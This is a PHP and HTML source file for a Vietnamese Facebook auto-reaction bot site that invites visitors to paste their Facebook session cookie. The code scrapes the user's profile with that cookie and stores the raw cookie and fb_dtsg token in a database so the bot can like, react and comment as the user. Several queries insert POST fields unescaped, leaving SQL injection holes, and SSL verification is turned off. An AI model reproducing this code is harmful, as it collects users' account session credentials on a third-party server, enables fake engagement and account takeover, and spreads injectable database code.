<?php
session_start();
include'config.php';
$tonguser = mysql_result(mysql_query("select count(*) from `Account`"),0);

?>
<!DOCTYPE html>
<html>

<!-- Mirrored from webapplayers.com/luna_admin-v1.1/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 22 Jul 2016 03:26:12 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link href='https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900' rel='stylesheet' type='text/css'>

    <!-- Page title -->
    <title>Bot Cảm Xúc Chất Nhất Việt Nam</title>

    <!-- Vendor styles -->
    <link rel="stylesheet" href="vendor/fontawesome/css/font-awesome.css"/>
    <link rel="stylesheet" href="vendor/animate.css/animate.css"/>
    <link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.css"/>
    <link rel="stylesheet" href="vendor/toastr/toastr.min.css"/>

    <!-- App styles -->
    <link rel="stylesheet" href="styles/pe-icons/pe-icon-7-stroke.css"/>
    <link rel="stylesheet" href="styles/pe-icons/helper.css"/>
    <link rel="stylesheet" href="styles/stroke-icons/style.css"/>
    <link rel="stylesheet" href="styles/style.css">
</head>
<body>

<!-- Wrapper-->
<div class="wrapper">

    <!-- Header-->
    <nav class="navbar navbar-default navbar-fixed-top">
        <div class="container-fluid">
            <div class="navbar-header">
                <div id="mobile-menu">
                    <div class="left-nav-toggle">
                        <a href="#">
                            <i class="stroke-hamburgermenu"></i>
                        </a>
                    </div>
                </div>
                <a class="navbar-brand" href="/">
                    CamXuc
                    <span>version Pro</span>
                </a>
            </div>
            <div id="navbar" class="navbar-collapse collapse">
                <div class="left-nav-toggle">
                    <a href="#">
                        <i class="stroke-hamburgermenu"></i>
                    </a>
                </div>
                <form class="navbar-form navbar-left">
<b class="form-control" style="width: 230px">Bot Cảm Xúc - ThbaoVN.Com</b>
                </form>
                <ul class="nav navbar-nav navbar-right">
                    <li class="dropdown">
                        <a href="/" >Versions
                            <span class="label label-warning pull-right">Cookie</span>
                        </a>
                    </li>
                    <li class=" profil-link">
                        <a href="https://thbao.me">
                            <span class="profile-address">admin</span>
                            <img src="https://graph.fb.me/100010087203953/picture" class="img-circle" alt="">
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <!-- End header-->

    <!-- Navigation-->
    <aside class="navigation">
        <nav>
            <ul class="nav luna-nav">
                <li class="nav-category">
                    Main
                </li>
                <li class="active">
                    <a href="/">Dashboard</a>
                </li>

                <li>
                    <a href="#monitoring" data-toggle="collapse" aria-expanded="false">
                        Chức Năng<span class="sub-nav-icon"> <i class="stroke-arrow"></i> </span>
                    </a>
                    <ul id="monitoring" class="nav nav-second collapse">
                        <li><a href="/"> Bot Cảm Xúc</a></li>
                    </ul>
                </li>
<?php if(isset($_SESSION[id]))
{
echo'
                <li class="nav nav-second collapse">
                    <a href="/logout.php">Đăng Xuất</a>
                </li>';
} ?>
                
                <li class="nav-info">
                    <i class="pe pe-7s-shield text-accent"></i>
                    <div class="m-t-xs">
                        <span class="c-white">BotCamXuc</span> Phiên bản Pro với tính năng mới lạ hơn, người dùng được chọn nhiều cảm xúc hơn để Bot auto.
                    </div>
                </li>
            </ul>
        </nav>
    </aside>
    <!-- End navigation-->


    <!-- Main content-->
    <section class="content">
            <div class="container-fluid">

                <div class="row">
                    <div class="col-lg-12">
                        <div class="view-header">
                            <div class="pull-right text-right" style="line-height: 14px">
                                <small>Cảm Xúc<br>Dashboard<br> <span class="c-white">version Pro</span></small>
                            </div>
                            <div class="header-icon">
                                <i class="pe page-header-icon pe-7s-shield"></i>
                            </div>
                            <div class="header-title">
                                <h3 class="m-b-xs">ThbaoVN.Com</h3>
                                <small>
   Update thêm Cảm Xúc mới từ Facebook... Thả hoa, thả tim, thả thính ... :v
                                </small>
                            </div>
                        </div>
                        <hr>
                    </div>
                </div>

                <div class="row">
<?php if(!$_SESSION[id])
{
    ?>
                    <div class="col-md-6">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Đăng Nhập
                        </div>
                        <div class="panel-body">
						<p> Nếu Bạn Sử Dụng <code> ThbaoVN.Com</code> Trên Điện Thoại Và Không Lấy Được Cookie  ? <p>
							<a class="btn btn-success btn-block" target="_blank" href="/lien-he-admin"><i class="fa fa-cog" aria-hidden="true"></i> Click Vào Đây . Chúng Tôi Sẽ Hỗ Trợ Cài Bot Cho Bạn ♥ </a>
                            <p> Cập Nhật Chức Năng  <code> Bot Like Và BOT Comment</code> : Tự Đặt Nội Dung <p>

                            <p>Dùng Cookie Để Hạn Chế Không Bao Giờ Die Token 100% </p>

                            <form action="" method="POST">
                                <div class="form-group"><label for="exampleInputEmail1">Cookie ( Cách Lấy Cookie Vui Lòng Lên Google.Com )</label> <input type="text" class="form-control" id="cookie" name="cookie" placeholder="Cookie"></div>
                                                             
                                <button type="submit" class="btn btn-default">Đăng nhập</button>
                            </form>
                        </div>
                    </div>

                </div>
<?php } else {  
                $dem = mysql_result(mysql_query("select count(*) from `Account` where `user_id`='".$_SESSION['id']."' "),0);
                if($dem == 0)
                {
                    $tinhtrang = 'Bạn Chưa Cài BOT';
                    $tokenn = $_SESSION[token];
                    $submitt ='Cài BOT';
                }
                else
                {
                    $tokenn = 'tatbot';
                    $submitt ='Cập Nhật BOT';
                    $camxuccuaban = mysql_fetch_array(mysql_query("SELECT * FROM `Account` where `user_id`='".$_SESSION['id']."'"));
                   //Không được sửa phần này !!
				   if($camxuccuaban[camxuc] == '1') $camxuc='Thả Like';
                    if($camxuccuaban[camxuc] == '2') $camxuc='Thả Tim';
                    if($camxuccuaban[camxuc] == '3') $camxuc='WOW';
                    if($camxuccuaban[camxuc] == '4') $camxuc='Cười';
                    if($camxuccuaban[camxuc] == '7') $camxuc='Buồn';
                    if($camxuccuaban[camxuc] == '8') $camxuc='Phẫn Nộ';
                    if($camxuccuaban[camxuc] == '11') $camxuc='Thả Hoa';
                    $tinhtrang ='Bạn Đã Cài BOT '.$camxuc.'';
                }
            ?>
    <div class="col-md-6">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Bảng Điều Khiển
                        </div>
                        <div class="panel-body">
                            <p>Xin chào <code><?php echo $_SESSION[name]; ?></code> - <code><?php echo $_SESSION[id]; ?></code></p>
                             <p>Tình Trạng: <code><?php echo $tinhtrang; ?></code></p>
                             <form action="" method="POST">
                            <div class="radio"><label> <input type="radio" name="CamXuc" id="LOVE" value="1" checked="checked"> Cảm Xúc: Thả Like </label></div>
                            <div class="radio"><label> <input type="radio" name="CamXuc" id="LOVE" value="2" checked="checked"> Cảm Xúc: Thả Tim </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="WOW" value="3">Cảm Xúc: WOW </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="HAHA" value="4">Cảm Xúc: Cười </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="SAD" value="7">Cảm Xúc: Buồn </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="ANGRY" value="8">Cảm Xúc: Phẫn Nộ </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="THANKFUL" value="11">Cảm Xúc: Thả Hoa </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="ANGRY" value="tatbot">Tắt BOT </label></div>
                                        <div class="form-group">
  <label for="comment">Nội Dung Comment:<code><?php echo $camxuccuaban[comments];?> </code></label>
  <textarea class="form-control" rows="5" name="comment"></textarea>
</div>
<div class="radio"><label> <input type="radio" name="battatcmt" id="battatcmt" value="tatcmt">Tắt Comments </label></div>
<div class="radio"><label> <input type="radio" name="battatcmt" id="battatcmt" value="batcmt">Bật Comments </label></div>

                                        <center><button type="submit" class="btn btn-w-md btn-success"><?php echo $submitt; ?></button>
                                        
                                        </form>   </center>                      
                            
                        </div>
                    </div>

                </div>
                <?php } ?>
                <div class="col-md-6">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Thống Kê
                        </div>
                        <div class="panel-body">
                        <?php
                        $file = scandir('log/');
                        ?>
                            <p>Thông tin người dùng <code>mới nhất</code> được cập nhật tại đây.</p>
                            <p>Số người dùng <code><?php echo $tonguser; ?></code> - Đã Phang <code><?php echo count($file)-2;?> </code> ID.</p>

                            <div class="table-responsive">
                                <table  class="table table-hover table-striped">
                                    <thead>
                                    <tr>
                                        <th>CX</th>
                                        <th>Name</th>
                                        <th>ID</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <?php 
$infongdung = mysql_query("SELECT * FROM `Account` ORDER BY id DESC LIMIT 4");
while ($getpuaru = mysql_fetch_array($infongdung)){
	//Không được sửa phần này !!
             if($getpuaru[camxuc] == '1') $camxuc='Thả Like';
                       if($getpuaru[camxuc] == '2') $camxuc='Thả Tim';
                       if($getpuaru[camxuc] == '3') $camxuc='WOW';
                       if($getpuaru[camxuc] == '4') $camxuc='Cười';
                       if($getpuaru[camxuc] == '7') $camxuc='Buồn';
                       if($getpuaru[camxuc] == '8') $camxuc='Phẫn Nộ';
                       if($getpuaru[camxuc] == '11') $camxuc='Thả Hoa';
    ?>
                                    <tr>
                                        <td><?php echo $camxuc;?></td>
                                        <td><?php echo $getpuaru[name];?></td>
                                        <td><?php echo $getpuaru[user_id];?></td>
                                    </tr>                                   
<?php } ?>
                                    </tbody>
                                </table>
                            </div>

                        </div>
                    </div>
                </div>


                </div>
                
    </section>
    <!-- End main content-->

</div>
<!-- End wrapper-->

<!-- Vendor scripts -->
<script src="vendor/pacejs/pace.min.js"></script>
<script src="vendor/jquery/dist/jquery.min.js"></script>
<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<script src="vendor/toastr/toastr.min.js"></script>
<script src="vendor/sparkline/index.js"></script>
<script src="vendor/flot/jquery.flot.min.js"></script>
<script src="vendor/flot/jquery.flot.resize.min.js"></script>
<script src="vendor/flot/jquery.flot.spline.js"></script>

<!-- App scripts -->
<script src="scripts/luna.js"></script>

<script>
    $(document).ready(function () {


        // Sparkline charts
        var sparklineCharts = function () {
            $(".sparkline").sparkline([20, 34, 43, 43, 35, 44, 32, 44, 52, 45], {
                type: 'line',
                lineColor: '#FFFFFF',
                lineWidth: 3,
                fillColor: '#404652',
                height: 47,
                width: '100%'
            });

            $(".sparkline7").sparkline([10, 34, 13, 33, 35, 24, 32, 24, 52, 35], {
                type: 'line',
                lineColor: '#FFFFFF',
                lineWidth: 3,
                fillColor: '#f7af3e',
                height: 75,
                width: '100%'
            });

            $(".sparkline1").sparkline([0, 6, 8, 3, 2, 4, 3, 4, 9, 5, 3, 4, 4, 5, 1, 6, 7, 15, 6, 4, 0], {
                type: 'line',
                lineColor: '#2978BB',
                lineWidth: 3,
                fillColor: '#2978BB',
                height: 170,
                width: '100%'
            });

            $(".sparkline3").sparkline([-8, 2, 4, 3, 5, 4, 3, 5, 5, 6, 3, 9, 7, 3, 5, 6, 9, 5, 6, 7, 2, 3, 9, 6, 6, 7, 8, 10, 15, 16, 17, 15], {

                type: 'line',
                lineColor: '#fff',
                lineWidth: 3,
                fillColor: '#393D47',
                height: 70,
                width: '100%'
            });

            $(".sparkline5").sparkline([0, 6, 8, 3, 2, 4, 3, 4, 9, 5, 3, 4, 4, 5], {
                type: 'line',
                lineColor: '#f7af3e',
                lineWidth: 2,
                fillColor: '#2F323B',
                height: 20,
                width: '100%'
            });
            $(".sparkline6").sparkline([0, 1, 4, 2, 2, 4, 1, 4, 3, 2, 3, 4, 4, 2, 4, 2, 1, 3], {
                type: 'bar',
                barColor: '#f7af3e',
                height: 20,
                width: '100%'
            });

            $(".sparkline8").sparkline([4, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline9").sparkline([3, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline10").sparkline([4, 1], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline11").sparkline([1, 3], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline12").sparkline([3, 5], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline13").sparkline([6, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
        };

        var sparkResize;

        // Resize sparkline charts on window resize
        $(window).resize(function () {
            clearTimeout(sparkResize);
            sparkResize = setTimeout(sparklineCharts, 100);
        });

        // Run sparkline
        sparklineCharts();


        // Flot charts data and options
        var data1 = [ [0, 16], [1, 24], [2, 11], [3, 7], [4, 10], [5, 15], [6, 24], [7, 30] ];
        var data2 = [ [0, 26], [1, 44], [2, 31], [3, 27], [4, 36], [5, 46], [6, 56], [7, 66] ];

        var chartUsersOptions = {
            series: {
                splines: {
                    show: true,
                    tension: 0.4,
                    lineWidth: 1,
                    fill: 1

                }

            },
            grid: {
                tickColor: "#404652",
                borderWidth: 0,
                borderColor: '#404652',
                color: '#404652'
            },
            colors: [ "#f7af3e","#DE9536"]
        };

        $.plot($("#flot-line-chart"), [data2, data1], chartUsersOptions);


        // Run toastr notification with Welcome message
        setTimeout(function(){
            toastr.options = {
                "positionClass": "toast-top-right",
                "closeButton": true,
                "progressBar": true,
                "showEasing": "swing",
                "timeOut": "6000"
            };
            toastr.warning('<strong>Welcome to BotCamXuc</strong> <br/><small>Phiên Bản Pro Có Thể Chọn Cảm Xúc Riêng Cho Bạn. </small>');
        },1600)


    });
</script>
</body>


<!-- Mirrored from webapplayers.com/luna_admin-v1.1/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 22 Jul 2016 03:26:34 GMT -->
</html>
<?php
                                        if($_POST[cookie] && !$_SESSION[id])
                                        {
                                        	$url = curl("https://m.facebook.com/profile.php",$_POST[cookie]);
	//echo $url;
	//exit;
	if(preg_match('#<title>(.+?)</title>#is',$url, $_puaru))
    {
    	$name = $_puaru[1];
    }
    if(preg_match('#name="target" value="(.+?)"#is',$url, $_puaru))
    {
    	$id = $_puaru[1];
    }
    if(preg_match('#name="fb_dtsg" value="(.+?)"#is',$url, $_puaru))
    {
    	$fb_dtsg = $_puaru[1];
    }
    if($name && $id && $fb_dtsg)
    {         
                          
                                            $_SESSION[id] = $id;
                                            $_SESSION[name] = $name;
                                            $_SESSION[fb_dtsg] = $fb_dtsg;
                                            $_SESSION[cookie] = $_POST[cookie];
                                            ?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php

                                        } else {
                                            die('<script>alert("Lấy Lại Cookie"); </script>');
                                        }
                                    }
                                                                            

if($_POST[CamXuc] && $_SESSION[id])
{
    if($_POST[CamXuc] == 'tatbot')
    {
mysql_query("
            DELETE FROM
               Account
            WHERE
               user_id='" . mysql_real_escape_string($_SESSION[id]) . "' 
         ");
?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php
    }
    else
    {
    mysql_query("CREATE TABLE IF NOT EXISTS `Account` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `fb_dtsg` text NOT NULL,
      `cookie` text NOT NULL,
      `camxuc` text NOT NULL,
      `comments` text NOT NULL,
      `battatcmt` varchar(32) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");

    $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         Account
      WHERE
         user_id = '" . mysql_real_escape_string($_SESSION[id]) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               Account
            WHERE
               user_id='" . mysql_real_escape_string($_SESSION[id]) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 if($_POST[battatcmt] != 'tatcmt')
    {
        if(!$row){
      mysql_query(
         "INSERT INTO 
            Account
         SET
            `user_id` = '" . mysql_real_escape_string($_SESSION[id]) . "',            
            `name` = '" . mysql_real_escape_string($_SESSION[name]) . "',
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = '" . $_POST[comment] . "',
            `battatcmt` = '1',
            `cookie` = '" . $_SESSION[cookie] . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            Account
         SET
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',            
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = '" . $_POST[comment] . "',
            `battatcmt` = '1',
            `cookie` = '" . $_SESSION[cookie] . "'

         WHERE
            `id` = " . $row['id'] . "
      ");
   }
    }
    else
    {
        if(!$row){
      mysql_query(
         "INSERT INTO 
            Account
         SET
            `user_id` = '" . mysql_real_escape_string($_SESSION[id]) . "',            
            `name` = '" . mysql_real_escape_string($_SESSION[name]) . "',
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = 'Chưa Có Nội Dung Vì Bạn Đang Tắt Chức Năng Này',
            `battatcmt` = '0',
            `cookie` = '" . $_SESSION[cookie] . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            Account
         SET
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',            
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = 'Chưa Có Nội Dung Vì Bạn Đang Tắt Chức Năng Này',
            `battatcmt` = '0',
            `cookie` = '" . $_SESSION[cookie] . "'

         WHERE
            `id` = " . $row['id'] . "
      ");
   }
    }
   
?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php
}}

function get($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
   function curl($url,$cookie)
{
    $ch = @curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Expect:'
    ));
    $page = curl_exec($ch);
    curl_close($ch);
    return $page;
} 
function post_data($site,$data,$cookie){
    $datapost = curl_init();
    $headers = array("Expect:");
    curl_setopt($datapost, CURLOPT_URL, $site);
    curl_setopt($datapost, CURLOPT_TIMEOUT, 40000);
    curl_setopt($datapost, CURLOPT_HEADER, TRUE);

    curl_setopt($datapost, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($datapost, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($datapost, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36');
    curl_setopt($datapost, CURLOPT_POST, TRUE);
    curl_setopt($datapost, CURLOPT_POSTFIELDS, $data);
    curl_setopt($datapost, CURLOPT_COOKIE,$cookie);
    ob_start();
    return curl_exec ($datapost);
    ob_end_clean();
    curl_close ($datapost);
    unset($datapost); 
} 
?>
<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v2.5";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>